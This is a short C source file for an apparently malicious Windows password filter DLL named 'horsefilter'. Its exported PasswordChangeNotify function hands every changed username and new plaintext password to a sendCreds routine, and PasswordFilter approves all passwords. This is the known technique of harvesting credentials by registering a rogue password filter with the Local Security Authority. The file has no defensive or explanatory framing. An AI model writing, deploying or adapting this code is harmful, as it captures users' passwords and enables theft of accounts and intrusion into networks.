#include "horsefilter.h"
#include <windows.h>

__declspec(dllexport) 
BOOLEAN WINAPI InitializeChangeNotify(void)
{
	return TRUE;
}

__declspec(dllexport)
NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeID, PUNICODE_STRING NewPassword)
{
	sendCreds(UserName, NewPassword);
	return TRUE;
}

__declspec(dllexport)
BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
{
	return TRUE;
}
